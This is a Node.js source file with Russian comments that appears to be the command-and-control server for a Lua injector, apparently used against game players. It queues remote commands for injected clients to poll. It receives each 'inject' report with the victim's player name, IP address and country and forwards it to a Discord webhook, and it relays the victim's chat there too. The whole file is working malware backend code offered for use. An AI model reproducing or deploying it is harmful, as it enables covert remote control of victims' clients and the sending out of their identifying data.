const http = require('http');
const fetch = require('node-fetch');

const WEBHOOK_URL = "ВАШ_ВЕБХУК";
let lastCommand = "";
let lastArgs = [];
let lastChatMessage = "";
let lastInjectData = null;

const server = http.createServer(async (req, res) => {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  
  // Прием команд от бота
  if (req.method === 'POST' && req.url === '/command') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      const { command, args } = JSON.parse(body);
      lastCommand = command;
      lastArgs = args;
      console.log(`[CMD] ${command}`, args);
      res.end(JSON.stringify({ status: "OK" }));
    });
    return;
  }

  // Получение данных для Lua
  if (req.method === 'GET' && req.url === '/data') {
    res.end(JSON.stringify({ 
      command: lastCommand,
      args: lastArgs,
      chatMessage: lastChatMessage,
      injectData: lastInjectData
    }));
    lastCommand = "";
    lastChatMessage = "";
    return;
  }

  // Прием данных от Lua
  if (req.method === 'POST' && req.url === '/inject') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      lastInjectData = JSON.parse(body);
      
      // Отправка в Discord
      fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `🔌 Инжект от ${lastInjectData.player}\n` +
                   `IP: ${lastInjectData.ip}\n` +
                   `Страна: ${lastInjectData.country}`
        })
      });
      
      res.end(JSON.stringify({ status: "OK" }));
    });
    return;
  }

  // Чат от жертвы
  if (req.method === 'POST' && req.url === '/chat') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      const { message } = JSON.parse(body);
      lastChatMessage = message;
      fetch(WEBHOOK_URL, {
        method: 'POST',
        body: JSON.stringify({ content: `💬 ${message}` })
      });
      res.end(JSON.stringify({ status: "OK" }));
    });
    return;
  }

  res.writeHead(404);
  res.end("Not found");
});

server.listen(process.env.PORT || 3000);
